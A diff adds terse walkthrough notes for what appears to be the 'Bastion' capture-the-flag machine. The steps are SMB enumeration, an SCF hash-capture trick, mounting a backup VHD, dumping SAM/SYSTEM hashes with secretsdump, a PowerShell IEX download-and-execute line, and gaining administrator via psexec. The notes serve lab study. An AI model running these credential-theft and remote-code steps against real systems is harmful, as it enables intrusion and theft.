@@ -1,0 +1,35 @@
+BASTION server - a jump to other resources
+nmap
+There's a port open microsoft-ds (SMB). Try anonymous access
+smbclient -L //IP and hit enter
+smbmap -u DoesNotExist -H IP
+	There's WRITE permissions in the Backups directory. Put an scf file that will drop hashes of authenticated (probably automated) users. See other video (syzzle?)
+mount -t cifs //IP/Backups /mnt/smb and hit enter
+Always be aware of what your tools do. Even if you're the defender, because those could be IOCs (Indicators Of Compromise)
+du -hs (to see the size of files)
+7z l *.vhd (for virtual hard drives (partition))
+To mount a vhd in Linux, use guestmount
+guestmount --add *.vhd --inspector --ro -v /mnt/vhd
+find Desktop/ Documents/ Downloads/ -ls (to list all the files)
+In Windows/System32/config -> SAM and SYSTEM are the registry hives (HKEY/LocalMachine). User DB in the SAM, but the bootkey (with which the User DB is encrypted) is in SYSTEM. In a domain control also grab NTDS to extract the ActiveDirectory database
+impacket-secretsdump -sam SAM -system SYSTEM local
+	31d6 means blank hashes (Why?)
+Get new user. See if it has write access to C volume. If it has we can use psexec and get administrator
+	smbmap -u user -p hash -H IP
+hashes.org
+Once in the box as user
+net localgroup administrators
+net user "user"
+net user Administrator
+Run JAWS Enumberation (Just Another Windows Script)
+In powershell
+PS IEX(New-Object Net.WebClient).downloadString('URL')
+*TIP: Always do Recon in the background and work while doing recon
+Take a look at Logs
+There's an application that looks unique (mRemoteNG - remote management tool)
+Generally config data is in AppData/Roaming in a Users folder
+type is Window's cat
+He got credentials - either do ssh or:
+cd /usr/share/doc/python-impacket/examples/; python psexec.py administrator@IP
+When running psexec -> User is System
+When running ssh -> User is Administrator
